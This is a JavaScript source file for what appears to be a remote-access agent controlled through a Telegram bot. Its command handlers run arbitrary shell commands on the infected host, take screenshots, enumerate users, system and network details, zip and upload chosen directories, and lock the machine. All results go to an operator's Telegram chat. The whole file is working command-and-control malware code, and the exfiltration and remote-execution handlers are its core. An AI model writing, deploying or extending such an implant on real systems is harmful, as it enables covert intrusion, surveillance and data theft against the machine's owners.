/* Define required modules */
const TelegramBot = require('node-telegram-bot-api');
const config = require('./config.json');

/* import modules */
const agent = require('./modules/agent');
const recon = require('./modules/recon');
const system = require('./modules/system');
const exfil = require('./modules/exfil');
const exec = require('./modules/exec');


/* Define variables */
var bot = new TelegramBot(config.teleBotToken, {polling: true});

/* Commands */
bot.onText(/\/help/, (msg) => {
  let text =
  "Available Commands:\n\n" +

  "--Reconnaissance--\n" +
  "/recon/ping - Ping IPv4 address\n" +
  "/recon/whoami - User and workdir\n" +
  "/recon/users - Local user accounts\n" +
  "/recon/ss - Grab desktop screenshot\n" +
  "/recon/systeminfo - Get system information\n\n" +

  "--Execute--\n" +
  "/exec/head - Run a command (head)\n" +
  "/exec/headless - Run a command (headless)\n\n" +

  "--Exfiltrate--\n" +
  "/exfil/dir - Exfiltrate a directory\n\n" +

  "--System--\n" +
  "/system/lock - Lock the system\n\n" +

  "--Agent--\n" +
  "/agent/pid - Agent PID\n";

  bot.sendMessage(config.teleChatID, text);
})


//get Agent PID
bot.onText(/\/agent\/pid/, (msg) => {
  agent.getPid()
  .then((pid) => {
    bot.sendMessage(config.teleChatID, "Process ID: " + pid);
  });
})


// Execute an arbitrary command
// head
bot.onText(/\/exec (.+)/, (msg, match) => {
  let cmd = match[1]
  exec.head(cmd)
  .then((result) => {
    bot.sendMessage(config.teleChatID, result)
  })
  .catch((error) => {
    bot.sendMessage(config.teleChatID, "Error: " + error)
  });
});

// headless
bot.onText(/\/exec\/headless (.+)/, (msg, match) => {
  let cmd = match[1]
  exec.noHead(cmd)
  .then((result) => {
    bot.sendMessage(config.teleChatID, result)
  })
  .catch((error) => {
    bot.sendMessage(config.teleChatID, "Error: " + error)
  });
});


bot.onText(/\/system\/lock/, (msg) => {
  system.lock()
  .then((result) => {
    bot.sendMessage(config.teleChatID, result)
  })
  .catch((error) => {
    bot.sendMessage(config.teleChatID, error)
  });
});


//Ping
bot.onText(/\/recon\/ping (.+)/, (msg, match) => {
  const ip = match[1];
  recon.ping(ip)
  .then((result) => {
    bot.sendMessage(config.teleChatID, result)
  });
});


//System information
bot.onText(/\/recon\/systeminfo/, (msg) => {
  recon.systeminfo()
  .then((result) => {
    let text =
      "Hostname: " + result[0] + "\n" +
      "Platform: " + result[1] + "\n" +
      "Type: " + result[2] + "\n" +
      "Release: " + result[3] + "\n" +
      "Networking: " + "\n\n" + result[4] + "\n";
    bot.sendMessage(config.teleChatID, text);
  });
});


//whoami
bot.onText(/\/recon\/whoami/, (msg) => {
  recon.whoami()
  .then((result) => {
    let text =
      "Username: " + result[0] + "\n" +
      "HomeDir: " + result[1] + "\n";
    bot.sendMessage(config.teleChatID, text);
  });
});


//Users
bot.onText(/\/recon\/users/, (msg) => {
  recon.users()
  .then((result) => {
    let text =
      "Users: " + result;
    bot.sendMessage(config.teleChatID, text);
  });
});


//Screenshot
/*
bot.onText(/\/recon\/ss/, (msg) => {
  recon.doScreenshot()
  .then((result) => {
    for(element=0; element<result.length; element++){
      bot.sendPhoto(config.teleChatID, result[element]);
    }
    //bot.sendMessage(config.teleChatID, result[0]);
  })
  .catch((error) => {
    console.error(error[0], error[1])
  });
});
*/


bot.onText(/\/recon\/ss/, (msg) => {
  recon.doScreenshot()
  .then((result) => {
    bot.sendMessage(config.teleChatID, result[0]);
    bot.sendPhoto(config.teleChatID, result[1]);
  })
  .catch((error) => {
    console.error(error[0], error[1])
  });
});


//exfil file
bot.onText(/\/exfil\/dir (.+)/, (msg, match) => {
  let dirName = match[1].replace(/\\/g, "/");
  //const resItem = finalName.replace(/\s/g, "+");
  exfil.zipDir(dirName)
  .then((result) => {
    bot.sendMessage(config.teleChatID, result[1]);
    bot.sendDocument(config.teleChatID, result[0]);
  })
  .catch((error) => {
    console.log(error);
  });
});


//---------------- Watchdog error ------------------
bot.on('polling_error', (error) => {
  console.log(error)
});



// ---------------- Init ----------------
agent.getPid()
.then((pid) => {
  //console.log("DEBUG: Interface online. Process PID: " + pid);
  bot.sendMessage(config.teleChatID, "Agent interface online. Process ID: " + pid);
});